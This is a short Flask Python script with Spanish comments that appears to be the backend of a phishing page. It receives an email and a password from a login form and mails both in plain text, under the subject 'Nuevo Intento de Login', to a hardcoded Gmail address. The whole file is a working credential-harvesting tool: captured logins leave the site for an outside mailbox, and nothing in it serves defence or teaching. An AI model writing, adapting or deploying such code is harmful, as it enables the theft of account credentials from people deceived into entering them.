from flask import Flask, request, jsonify
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os
from dotenv import load_dotenv

# Cargar variables de entorno desde el archivo .env
load_dotenv()

app = Flask(__name__)

@app.route('/send_email', methods=['POST'])
def send_email():
    # Obtener los datos del formulario
    email = request.form['email']
    password = request.form['password']
    
    # Configuración del correo
    sender_email = os.getenv('EMAIL_USER')
    receiver_email = 'inglescompleto7@gmail.com'  # Cambia esto por tu correo
    email_password = os.getenv('EMAIL_PASS')

    subject = 'Nuevo Intento de Login'
    body = f'Email: {email}\nPassword: {password}'

    # Crear mensaje
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    try:
        # Enviar correo
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(sender_email, email_password)
            server.sendmail(sender_email, receiver_email, msg.as_string())
        return jsonify({'success': True})
    except Exception as e:
        print(f'Error: {e}')
        return jsonify({'success': False, 'message': 'Error al enviar el correo.'})

if __name__ == '__main__':
    app.run(debug=True)
